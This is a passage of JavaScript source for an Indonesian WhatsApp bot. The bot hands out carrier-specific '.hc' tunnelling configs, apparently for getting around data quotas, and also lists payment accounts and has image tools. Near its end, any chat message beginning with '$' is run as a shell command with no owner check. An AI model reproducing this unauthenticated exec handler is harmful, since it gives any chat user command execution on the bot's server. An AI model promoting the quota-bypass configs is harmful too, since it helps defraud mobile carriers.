                                { "header": "XL PUBG", "title": "Klik untuk mengirim File", "id": ".sendfile xlpubg.hc" }, 
                                { "header": "XL SPOTIFY", "title": "Klik untuk mengirim File", "id": ".sendfile xlspotify.hc" },
                                
                                { "header": "XL TIKTOK", "title": "Klik untuk mengirim File", "id": ".sendfile xltiktok.hc" },
                                { "header": "XL VIDIO1", "title": "Klik untuk mengirim File", "id": ".sendfile xlvidio1.hc" }, 
                                { "header": "XL VIDIO2", "title": "Klik untuk mengirim File", "id": ".sendfile xlvidio2.hc" },
                                { "header": "XL VIU", "title": "Klik untuk mengirim File", "id": ".sendfile xlviu.hc" },                                                                                                
                                { "header": "XL XCL", "title": "Klik untuk mengirim File", "id": ".sendfile xcl.hc" }
                            ]}]}` 
                        }]
                    })
                })
            }
        } 
    }, { userJid: m.sender });

    await tamzz.relayMessage(msgii.key.remoteJid, msgii.message, { 
        messageId: msgii.key.id 
    });
}
break;
        
case 'sendfile': {
    const fileName = args[0];
    let filePath;
    let mimeType;

    switch (fileName) {
      //================
    	case 'allconfig.zip':
            filePath = './configs/allconfig-fadzvpn.zip'; 
            mimeType = 'application/zip'; 
            break;
        //===============1
        case 'axisedu1.hc':
            filePath = './configs/AXIS-EDU1-FADZVPN.hc';
            mimeType = 'application/octet-stream';
            break;
       //=============== 2    
         case 'axisedu2.hc':
            filePath = './configs/AXIS-EDU2-FADZVPN.hc';
            mimeType = 'application/octet-stream';
            break;
        //================3
         case 'axisedu3.hc':
            filePath = './configs/AXIS-EDU3-FADZVPN.hc'; 
            mimeType = 'application/octet-stream'; 
            break;
         //===============4
        case 'axisfb1.hc':
            filePath = './configs/AXIS-FB-FADZVPN.hc';
            mimeType = 'application/octet-stream';
            break;
       //=============== 5
         case 'axisfb2.hc':
            filePath = './configs/AXIS-FB2-FADZVPN.hc';
            mimeType = 'application/octet-stream';
            break;
        //================ 6
         case 'axisgame1.hc':
            filePath = './configs/AXIS-GAME1-FADZVPN.hc'; 
            mimeType = 'application/octet-stream'; 
            break;
        //=============== 7
        case 'axisgame2.hc':
            filePath = './configs/AXIS-GAME2-FADZVPN.hc';
            mimeType = 'application/octet-stream';
            break;
       //===============  8
         case 'axisgame3.hc':
            filePath = './configs/AXIS-GAME3-FADZVPN.hc';
            mimeType = 'application/octet-stream';
            break;
        //================9
         case 'axisgame4.hc':
            filePath = './configs/AXIS-GAME4-FADZVPN.hc'; 
            mimeType = 'application/octet-stream'; 
            break;
        //===============10
        case 'axisgame5.hc':
            filePath = './configs/AXIS-GAMEE-FADZVPN.hc';
            mimeType = 'application/octet-stream';
            break;
       //===============  11
         case 'axisgenflix1.hc':
            filePath = './configs/AXIS-GENFLIX1-FADZVPN.hc.hc';
            mimeType = 'application/octet-stream';
            break;
        //================12
         case 'axisgenflix2.hc':
            filePath = './configs/AXIS-GENFLIX2-FADZVPN.hc'; 
            mimeType = 'application/octet-stream'; 
            break;
         //===============13
        case 'axisig.hc':
            filePath = './configs/AXIS-INSTAGRAM-FADZVPN.hc';
            mimeType = 'application/octet-stream';
            break;
       //=============== 14
         case 'axiskomik.hc':
            filePath = './configs/AXIS-KOMIK-FADZVPN.hc';
            mimeType = 'application/octet-stream';
            break;
        //================15
         case 'axismusik.hc':
            filePath = './configs/AXIS-MUSIK-FADZVPN.hc'; 
            mimeType = 'application/octet-stream'; 
            break;
        //===============16
        case 'axisnetflix.hc':
            filePath = './configs/AXIS-NETFLIX-FADZVPN.hc';
            mimeType = 'application/octet-stream';
            break;
       //===============17
         case 'axisopok1.hc':
            filePath = './configs/AXIS-OPOK1-FADZVPN.hc';
            mimeType = 'application/octet-stream';
            break;
        //================18
         case 'axissosmed1.hc':
            filePath = './configs/AXIS-SOSMED-FADZVPN.hc'; 
            mimeType = 'application/octet-stream'; 
            break;
        //===============19
        case 'axissosmed2.hc':
            filePath = './configs/AXIS-SOSMED2-FADZVPN.hc';
            mimeType = 'application/octet-stream';
            break;
       //===============20
         case 'axissosmed3.hc':
            filePath = './configs/AXIS-SOSMED3-FADZVPN.hc';
            mimeType = 'application/octet-stream';
            break;
        //================21
         case 'axisspotify.hc':
            filePath = './configs/AXIS-SPOTIFY-FADZVPN.hc'; 
            mimeType = 'application/octet-stream'; 
            break;
         //===============22
        case 'axissushiroll1.hc':
            filePath = './configs/AXIS-SUSHIROLL1-FADZVPN.hc';
            mimeType = 'application/octet-stream';
            break;
       //=============== 23
         case 'axissushiroll2.hc':
            filePath = './configs/AXIS-SUSHIROLL2-FADZVPN.hc';
            mimeType = 'application/octet-stream';
            break;
        //================24
         case 'axistiktok.hc':
            filePath = './configs/AXIS-TIKTOK-FADZVPN.hc'; 
            mimeType = 'application/octet-stream'; 
            break;
        //===============25
        case 'axisvidio1.hc':
            filePath = './configs/AXIS-VIDIO1-FADZVPN.hc';
            mimeType = 'application/octet-stream';
            break;
       //=============== 26
         case 'axisvidio2.hc':
            filePath = './configs/AXIS-VIDIO2-FADZVPN.hc';
            mimeType = 'application/octet-stream';
            break;
        //================27
         case 'axisviu.hc':
            filePath = './configs/AXIS-VIU-FADZVPN.hc'; 
            mimeType = 'application/octet-stream'; 
            break;
        //===============28
        case 'axiswa.hc':
            filePath = './configs/AXIS-WA1-FADZVPN.hc';
            mimeType = 'application/octet-stream';
            break;
       //===============29
         case 'axisxlconfrence1.hc':
            filePath = './configs/AXIS-XL-CONFERENCE-FADZVPN.hc';
            mimeType = 'application/octet-stream';
            break;
        //================30
         case 'axisxlconference2.hc':
            filePath = './configs/AXIS-XL-CONFERENCE2-FADZVPN.hc'; 
            mimeType = 'application/octet-stream'; 
            break;
         //===============31
        case 'axisxledu1.hc':
            filePath = './configs/AXIS-XL-EDU1-FADZVPN.hc';
            mimeType = 'application/octet-stream';
            break;
       //===============32
         case 'axisxledu2.hc':
            filePath = './configs/AXIS-XL-EDU2-FADZVPN.hc';
            mimeType = 'application/octet-stream';
            break;
        //================33
         case 'axisxlopok.hc':
            filePath = './configs/AXIS-XL-OPOK.hc'; 
            mimeType = 'application/octet-stream'; 
            break;
        //===============34
        case 'kuotatiktok.hc':
            filePath = './configs/INTINYA-KUOTA-TIKTOK-FADZVPN.hc';
            mimeType = 'application/octet-stream';
            break;
       //===============35
         case 'isatappsfun.hc':
            filePath = './configs/ISAT-APPS-FUN-FADZVPN.hc';
            mimeType = 'application/octet-stream';
            break;
        //================36
         case 'isatgame1.hc':
            filePath = './configs/ISAT-GAME-FADZVPN.hc'; 
            mimeType = 'application/octet-stream'; 
            break;
        //===============37
        case 'isatgame2.hc':
            filePath = './configs/ISAT-GAME1-FADZVPN.hc';
            mimeType = 'application/octet-stream';
            break;
       //===============38
         case 'tselilped.hc':
            filePath = './configs/TSEL-ILPED-FADZVPN.hc';
            mimeType = 'application/octet-stream';
            break;
        //================39
         case 'tselomg.hc':
            filePath = './configs/TSEL-OMG-FADZVPN.hc'; 
            mimeType = 'application/octet-stream'; 
            break;
         //===============40
        case 'tselopok.hc':
            filePath = './configs/TSEL-OPOK-FADZVPN.hc';
            mimeType = 'application/octet-stream';
            break;
       //===============41
         case 'tselruangguru.hc':
            filePath = './configs/TSEL-RUANGGURU-FADZVPN.hc';
            mimeType = 'application/octet-stream';
            break;
        //================42
         case 'axisxledu3.hc':
            filePath = './configs/XL-EDU1-FADZVPN.hc'; 
            mimeType = 'application/octet-stream'; 
            break;
        //===============43
        case 'axisxledu4.hc':
            filePath = './configs/XL-EDU2-FADZVPN.hc';
            mimeType = 'application/octet-stream';
            break;
       //===============44
         case 'axisxledu5.hc':
            filePath = './configs/XL-EDU3-FADZVPN.hc';
            mimeType = 'application/octet-stream';
            break;
        //================45
         case 'xlfb.hc':
            filePath = './configs/XL-FB-FADZVPN.hc'; 
            mimeType = 'application/octet-stream'; 
            break;
       //===============46
        case 'xlflex.hc':
            filePath = './configs/XL-FLEX-FADZVPN.hc';
            mimeType = 'application/octet-stream';
            break;
       //===============47
         case 'xliflix.hc':
            filePath = './configs/XL-IFLIX-FADZVPN.hc';
            mimeType = 'application/octet-stream';
            break;
        //================48
         case 'xlig.hc':
            filePath = './configs/XL-INSTAGRAM-FADZVPN.hc'; 
            mimeType = 'application/octet-stream'; 
            break;
         //===============49
        case 'xlnetflix.hc':
            filePath = './configs/XL-NETFLIX-FADZVPN.hc';
            mimeType = 'application/octet-stream';
            break;
       //===============50
         case 'xlopok1.hc':
            filePath = './configs/XL-OPOK1-FADZVPN.hc';
            mimeType = 'application/octet-stream';
            break;
        //================51
         case 'xlpubg.hc':
            filePath = './configs/XL-PUBG-FADZVPN.hc'; 
            mimeType = 'application/octet-stream'; 
            break;
        //===============52
        case 'xlspotify.hc':
            filePath = './configs/XL-SPOTIFY-FADZVPN.hc';
            mimeType = 'application/octet-stream';
            break;
       //===============53
         case 'xltiktok.hc':
            filePath = './configs/XL-TIKTOK-FADZVPN.hc';
            mimeType = 'application/octet-stream';
            break;
        //================54
         case 'xlvidio1.hc':
            filePath = './configs/XL-VIDIO1-FADZVPN.hc'; 
            mimeType = 'application/octet-stream'; 
            break;
       //===============55
        case 'xlvidio2.hc':
            filePath = './configs/XL-VIDIO2-FADZVPN.hc';
            mimeType = 'application/octet-stream';
            break;
       //===============  56
         case 'xlviu.hc':
            filePath = './configs/XL-VIU-FADZVPN.hc';
            mimeType = 'application/octet-stream';
            break;
        //================57
         case 'xcl.hc':
            filePath = './configs/XL-XCL-FADZVPN.hc'; 
            mimeType = 'application/octet-stream'; 
            break;
       //================
        default:
            return m.reply('Onii-Chan, File tidak ditemukan!'); 
    }

    try {
        const fileBuffer = fs.readFileSync(filePath); 
        await tamzz.sendFile(m.chat, fileBuffer, fileName, "Onii-Chan, Ini config yg kamu Cari! , Jangan Lupa Buy Premium nya Yaaa Sekali-Kali🔥", m, { mimetype: mimeType });
    } catch (error) {
        console.error('Onii-Chan, Error saat membaca file:', error);
        m.reply('Onii-Chan, Terjadi kesalahan saat mencoba membaca file!');
    }
}
break
        
//=========================
case "sendpayment": case "payment": case "pay": case "listpayment": {
if (!isOwner) return reply(mess.only.owner)
let teksnya = `
SILAHKAN PILIH LIST PAYMENT DI BAWAH ONII-CHAN`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./thumb.png")}, { upload: tamzz.waUploadToServer })) 
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: "List Payment ϝαԃȥʋρɳ"
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "List Payment", "sections": [{ "title": "Silahkan Pilih Payment Di Bawah", "highlight_label": \"Powered By ${namaCreator}\", "rows": [{ "header": "DANA", "title": "DANA PAYMENT", "id": ".danapay" }, 
{ "header": "OVO", "title": "OVO PAYMENT", "id": ".ovopay" }, 
{ "header": "GOPAY", "title": "GOPAY PAYMENT", "id": ".gopaypay" }, 
{ "header": "QRIS", "title": "QRIS PAYMENT", "id": ".qrispay" }]}]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qpayment}) 
await tamzz.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "ovopay": {
if (global.ovo == false) return m.reply('Payment Dana Tidak Tersedia Onii-Chan')
let teks = `
┏╍╍╍┉╍☉ \`NO OVO\`
┋░▹ ${global.ovo}
┗━━━━━━━━━━━━━━━━━━
*Note :*
Demi Keamanan Bersama, Buyyer Wajib Mengirim Bukti Pembayaran Agar Tidak Terjadi Hal Yang Tidak Di Inginkan!
`
tamzz.sendText(m.chat, teks, m)
}
break
case "danapay": {
if (global.dana == false) return m.reply('Payment DanaTidak Tersedia Onii-Chan')
let teks = `
┏╍╍╍┉╍☉ \`NO DANA\`
┋░▹ ${global.dana}
┗━━━━━━━━━━━━━━━━━━
*Note :*
Demi Keamanan Bersama, Buyyer Wajib Mengirim Bukti Pembayaran Agar Tidak Terjadi Hal Yang Tidak Di Inginkan!
`
tamzz.sendText(m.chat, teks, m)
}
break
case "gopaypay": {
if (global.gopay == false) return m.reply('Payment GopayTidak Tersedia Onii-Chan')
let teks = `
┏╍╍╍┉╍☉ \`NO GOPAY\`
┋░▹ ${global.gopay}
┗━━━━━━━━━━━━━━━━━━
*Note :*
Demi Keamanan Bersama, Buyyer Wajib Mengirim Bukti Pembayaran Agar Tidak Terjadi Hal Yang Tidak Di Inginkan!
`
tamzz.sendText(m.chat, teks, m)
}
break
case "qrispay": {
if (global.qris == false) return m.reply('Payment QrisTidak Tersedia Onii-Chan')
let teks = `
*Untuk Pembayaran Melalui QRIS All Payment, Silahkan Scan Foto QRIS Diatas Ini*

*Note :*
Demi Keamanan Bersama, Buyyer Wajib Mengirim Bukti Pembayaran Agar Tidak Terjadi Hal Yang Tidak Di Inginkan!
`
tamzz.sendMessage(m.chat, {image: {url: global.qris}, caption: teks}, {quoted: qchanel})
}
break
case 'remini':
			case 'hd': {
			if (!isOwner) return reply(`FITUR KHUSUS OWNER 😊`)
			if (!quoted) return reply(`Fotonya Mana?`)
			if (!/image/.test(mime)) return reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
			reply(mess.wait)
			let media = await quoted.download()
			let proses = await remini(media, "enhance");
			tamzz.sendMessage(m.chat, { image: proses, caption: 'Onii-Chan, ini Hasilnya yaa...'}, { quoted: qpayment})
			await sleep(5000)
			}
			break
case 'tourl': {
if (!isOwner) return reply('*FITUR KHUSUS OWNER*')
 reply(mess.wait)
if (!/video/.test(mime) && !/image/.test(mime)) throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Image Caption* ${prefix + command}`
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./all/uploader')
let media = await tamzz.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
default:
}
if (budy.startsWith('$')) {
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)
})
}
if (budy.startsWith(">")) {
if (!isOwner) return reply(mess.only.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}
} catch (e) {
console.log(e)
tamzz.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}
}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})